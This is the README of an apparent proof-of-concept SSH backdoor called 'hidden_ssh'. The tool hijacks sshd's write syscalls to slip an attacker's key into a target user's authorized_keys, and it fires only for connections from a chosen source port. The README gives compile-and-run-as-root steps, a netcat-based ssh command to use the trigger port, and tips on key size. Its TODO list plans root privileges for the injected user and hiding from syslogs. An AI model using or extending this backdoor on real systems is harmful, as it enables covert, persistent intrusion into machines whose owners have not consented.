# hidden_ssh

`hidden_ssh` will inject a public key into the `authorized_keys` file of a targetted user only for the duration of the `sshd` process. This program is a proof of concept of hijacking `write` syscalls to inject a backdoor into `sshd` processes.

## Features ( & TODOs)

### Injection

- [x] Inject a public key into the `authorized_keys` file of a targetted user
- [ ] Add support for multiple users at runtime
- [ ] Give UID & GID = 0 to the injected user at trigger
- [ ] Hide from syslogs

### Trigger

- [x] Inject only when the connection is made from a specific TCP port

## Usage

Before compiling the program, you'll need to edit the `filename` and `overwritten_content` variables in `hidden_ssh.c` to match your needs. Then, compile the program:

```bash
$ make
```

After compiling the program, run it as root:

```bash
$ ./hidden_ssh
```

> [!IMPORTANT]
> It's necessary for the targetted user to have a `~/.ssh/authorized_keys` file and contain a larger key than the one we are injecting. Otherwise, the injection will fail.

You can now connect to the targetted user using the private key associated with the public key that you've injected.

```bash
$ ssh -o 'ProxyCommand nc -p 2345 %h %p' user@target -i private_key # Replace 2345 with the port you've chosen
```

> [!TIP] The smaller the better!
> The smaller the injected key is, the better it will fit in the `authorized_keys` file.
>
> You can use the `ED25519` algorithm to generate a smaller key.
> ```bash
> $ ssh-keygen -t ed25519 -f my_key
> ```